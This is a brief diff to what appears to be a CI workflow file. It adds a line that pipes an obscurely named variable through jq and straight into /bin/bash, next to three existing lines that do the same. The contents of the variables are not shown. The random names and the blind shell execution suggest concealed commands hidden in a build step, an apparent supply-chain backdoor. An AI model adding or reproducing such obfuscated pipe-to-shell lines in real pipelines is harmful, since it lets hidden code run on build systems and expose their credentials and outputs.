@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
           printf '%s' "$kxzr09" | jq -r .ox29376 | /bin/bash
           echo $s3 | jq -r .y72 | /bin/bash
+          echo $rqxs42746 | jq -r .j5 | /bin/bash
 
       - name: Save archive
         if: always()
